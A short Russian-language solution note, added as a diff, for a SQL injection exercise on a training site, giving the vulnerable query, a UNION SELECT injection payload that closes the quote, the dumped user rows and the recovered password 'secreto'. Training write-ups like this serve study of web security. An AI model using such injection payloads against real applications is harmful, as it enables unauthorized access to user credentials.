@@ -1,0 +1,19 @@
+http://sql.training.hackerdom.ru/2qnbutn.php
+--------------------------------------------
+
+
+Таблица: users
+Поля: id, login, pass
+Запрос: SELECT * FROM users WHERE id=2 OR login='$text' (вместо $text подставляется введённое ниже значение)
+Подсказка: использовать мозг и кавычку
+
+Тут естественно нужно банально закрыть ковычку, и написать union select * from users where id='9
+вот целый запрос
+1' union select * from users where id='9
+
+id login pass
+2  qwer  rewq
+9  secretlogin secreto
+
+Ответ: secreto
+
